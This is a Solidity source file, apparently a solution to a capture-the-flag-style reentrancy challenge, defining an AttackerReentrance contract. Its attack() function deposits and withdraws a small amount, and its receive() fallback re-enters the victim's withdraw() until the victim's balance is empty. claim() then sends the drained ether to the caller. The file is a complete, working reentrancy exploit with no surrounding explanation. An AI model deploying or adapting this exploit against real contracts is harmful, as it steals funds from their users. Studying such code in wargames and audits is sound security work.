// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IReentrance {

  function donate(address _to) external payable;

  function balanceOf(address _who) external view returns (uint balance);

  function withdraw(uint _amount) external;
}


contract AttackerReentrance{

    IReentrance victim;

    constructor(address _victim) payable {
        require(msg.value == 1000000000000000 wei);
        victim = IReentrance(_victim);
    }

    receive() external payable {
        if (address(victim).balance >= 1000000000000000 wei) {
            victim.withdraw(1000000000000000 wei);
        }
    }

    function attack() public {
        //Needs to be triggered 10 times in 10 different blocks
        victim.donate{value: 1000000000000000 wei}(address(this));
        victim.withdraw(1000000000000000 wei);
        require(address(victim).balance == 0);
    }

    function claim() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}